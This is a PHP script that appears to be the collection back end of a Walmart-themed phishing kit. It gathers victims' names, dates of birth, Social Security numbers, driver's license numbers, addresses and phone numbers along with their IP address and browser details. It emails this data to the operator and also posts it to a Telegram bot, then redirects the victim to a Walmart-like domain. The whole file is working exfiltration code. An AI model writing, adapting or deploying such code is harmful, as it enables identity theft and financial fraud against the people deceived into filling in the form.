<?php
    include './config.php';
    
    session_start();

    function getUserIpAddr(){
        if(!empty($_SERVER['HTTP_CLIENT_IP'])){
            //ip from share internet
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
            //ip pass from proxy
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        }else{
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }

    $ip = getUserIpAddr();
    $time = date("m-d-Y g:i:a");
    $agent = $_SERVER['HTTP_USER_AGENT'];

    $msg = "--------------SERVER--------------\n\n\n";
    $msg .= "Email: ".$_POST['email']."\n";
    $msg .= "First Name: ".$_POST['fname']."\n";
    $msg .= "Middle Name: ".$_POST['mname']."\n";
    $msg .= "Last Name: ".$_POST['lname']."\n";
    $msg .= "Date of Birth: ".$_POST['dob']."\n";
    $msg .= "SSN: ".$_POST['ssn']."\n";
    $msg .= "Driver's License Number: ".$_POST['license']."\n";
    $msg .= "Weigth as listed on your driver's license: ".$_POST['weigth']."\n";
    $msg .= "Current Mailing Address/Apt#: ".$_POST['address']."\n";
    $msg .= "City: ".$_POST['city']."\n";
    $msg .= "State: ".$_POST['state']."\n";
    $msg .= "Zip Code: ".$_POST['zipcode']."\n";
    $msg .= "Phone: ".$_POST['phone']."\n";
    $msg .= "Gender: ".$_POST['gender']."\n\n";
    $msg .= "---------------------------------\n\n\n";
    $msg .= "Sent from ".$ip."\n";
    $msg .= "User agent ".$agent."\n";
    $msg .= "Time ".$time."\n";
    $msg .= "http://www.geoiptool.com/?IP=".$ip."\n\n";
    $msg .= "--------------SERVER-------------\n";

    $subject = "WALMART DETAILS $email";

    mail($youremail,$subject,$msg);
    
    $tg_data = [ 
      'chat_id' => $chat_id, 
      'text' => $msg 
    ];
    $tg_response = file_get_contents("http://api.telegram.org/bot$bot_token/sendMessage?" . 
    http_build_query($tg_data) );

    header("Location: https://walmart.org");
?>